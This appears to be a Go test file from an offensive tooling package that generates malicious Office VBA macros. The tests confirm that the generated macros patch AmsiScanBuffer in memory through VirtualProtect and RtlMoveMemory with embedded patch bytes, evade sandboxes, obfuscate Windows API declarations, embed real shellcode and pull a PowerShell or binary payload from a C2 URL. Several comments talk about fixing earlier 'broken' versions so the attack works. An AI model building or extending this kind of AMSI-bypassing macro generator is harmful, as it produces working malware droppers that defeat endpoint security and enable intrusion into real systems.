package payload

import (
	"regexp"
	"strings"
	"testing"
)

func TestMacroAMSIByPassGeneratesWorkingVBA(t *testing.T) {
	cfg := MacroConfig{
		PayloadType:  "powershell",
		C2URL:        "http://127.0.0.1:8080/p",
		AMSIBypass:   true,
		SandboxEvasion: true,
		SplitStrings: true,
		Delay:        3,
	}
	out, err := GenerateMacroVBA(cfg)
	if err != nil {
		t.Fatalf("GenerateMacroVBA: %v", err)
	}

	// VirtualProtect and RtlMoveMemory must both be declared.
	for _, want := range []string{
		`Private Declare PtrSafe Function VirtualProtect Lib "kernel32"`,
		`Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32"`,
		"= &HB8", "= &H57", "= &HC3", // patch bytes are actually embedded
	} {
		if !strings.Contains(out, want) {
			t.Errorf("generated macro missing %q", want)
		}
	}
	// AmsiScanBuffer must be resolved at runtime via GetProcAddress
	// (the string argument may be split when SplitStrings is on).
	if !strings.Contains(out, "GetProcAddress(") {
		t.Errorf("GetProcAddress call missing:\n%s", out)
	}

	// The patch must be written via RtlMoveMemory with the real length.
	if !strings.Contains(out, "RtlMoveMemory ") || !strings.Contains(out, "(0), 6") {
		t.Errorf("AMSI patch is never written to AmsiScanBuffer:\n%s", out)
	}
	// The old dead assignment must be gone.
	if strings.Contains(out, "= &H80070057") {
		t.Errorf("dead patch-byte assignment still present:\n%s", out)
	}
	// The old broken VirtualProtect call (size 1, no write) must be gone.
	if strings.Contains(out, ", 1, &H40") {
		t.Errorf("legacy VirtualProtect call still present:\n%s", out)
	}

	// STARTUPINFO must mirror the native x64 layout: 1 Long + 4 LongPtr +
	// 9 Long + 2 Integer = 15 fields.
	siBody := extractTypeBody(t, out)
	if siBody == "" {
		t.Fatalf("no Private Type emitted:\n%s", out)
	}
	fieldTypes := regexp.MustCompile(`(?m)^    \w+ As (\w+)$`).FindAllStringSubmatch(siBody, -1)
	if len(fieldTypes) != 15 {
		t.Fatalf("STARTUPINFO has %d fields, want 15:\n%s", len(fieldTypes), siBody)
	}
	counts := map[string]int{}
	for _, m := range fieldTypes {
		counts[m[1]]++
	}
	if counts["Long"] != 9 || counts["LongPtr"] != 4 || counts["Integer"] != 2 {
		t.Errorf("STARTUPINFO field types = %v, want 9 Long / 4 LongPtr / 2 Integer", counts)
	}
}

func TestMacroObfuscateAMSIUsesDeclaredNames(t *testing.T) {
	cfg := MacroConfig{
		PayloadType: "powershell",
		C2URL:       "http://127.0.0.1:8080/p",
		AMSIBypass:  true,
		Obfuscate:   true,
	}
	out, err := GenerateMacroVBA(cfg)
	if err != nil {
		t.Fatalf("GenerateMacroVBA: %v", err)
	}

	// Declares exist with random names via Alias.
	for _, want := range []string{`Alias "LoadLibraryA"`, `Alias "GetProcAddress"`, `Alias "VirtualProtect"`} {
		if !strings.Contains(out, want) {
			t.Errorf("obfuscated macro missing declare alias %q:\n%s", want, out)
		}
	}
	// Calls must reference the randomized declared names, never literals.
	for _, bad := range []string{"= LoadLibrary(", "= GetProcAddress(", "= VirtualProtect("} {
		if strings.Contains(out, bad) {
			t.Errorf("obfuscated macro calls literal %q (would not compile):\n%s", bad, out)
		}
	}
}

func TestMacroBinaryEmbedsRealShellcode(t *testing.T) {
	cfg := MacroConfig{
		PayloadType: "binary",
		C2URL:       "http://127.0.0.1:8080/p",
		AMSIBypass:  true,
	}
	out, err := GenerateMacroVBA(cfg)
	if err != nil {
		t.Fatalf("GenerateMacroVBA: %v", err)
	}

	if !strings.Contains(out, "As Byte") {
		t.Fatalf("no byte array declared:\n%s", out)
	}
	// Byte assignments must be present (shellcode actually embedded).
	if !strings.Contains(out, "= &H") {
		t.Errorf("no shellcode bytes embedded:\n%s", out)
	}
	// RtlMoveMemory must copy the real length, not 0.
	re := regexp.MustCompile(`RtlMoveMemory \w+, \w+\(0\), (\d+)\r?\n`)
	m := re.FindStringSubmatch(out)
	if m == nil {
		t.Fatalf("RtlMoveMemory call not found:\n%s", out)
	}
	if m[1] == "0" {
		t.Errorf("RtlMoveMemory copies 0 bytes (broken binary payload):\n%s", out)
	}

	// Empty command without C2URL must error, not emit broken VBA.
	if _, err := GenerateMacroVBA(MacroConfig{PayloadType: "binary"}); err == nil {
		t.Error("binary payload with no command/C2URL should return an error")
	}
}

func TestMacroBinaryObfuscateKeepsDeclareCallConsistent(t *testing.T) {
	cfg := MacroConfig{
		PayloadType: "binary",
		C2URL:       "http://127.0.0.1:8080/p",
		AMSIBypass:  true,
		Obfuscate:   true,
	}
	out, err := GenerateMacroVBA(cfg)
	if err != nil {
		t.Fatalf("GenerateMacroVBA: %v", err)
	}
	for _, bad := range []string{"= LoadLibrary(", "= GetProcAddress(", "= VirtualProtect(", "= VirtualAlloc("} {
		if strings.Contains(out, bad) {
			t.Errorf("obfuscated macro calls literal %q:\n%s", bad, out)
		}
	}
}

// extractTypeBody returns the first `Private Type ... End Type` body.
func extractTypeBody(t *testing.T, src string) string {
	t.Helper()
	re := regexp.MustCompile(`(?s)Private Type \w+\n(.*?)\nEnd Type`)
	m := re.FindStringSubmatch(src)
	if m == nil {
		return ""
	}
	return m[1]
}
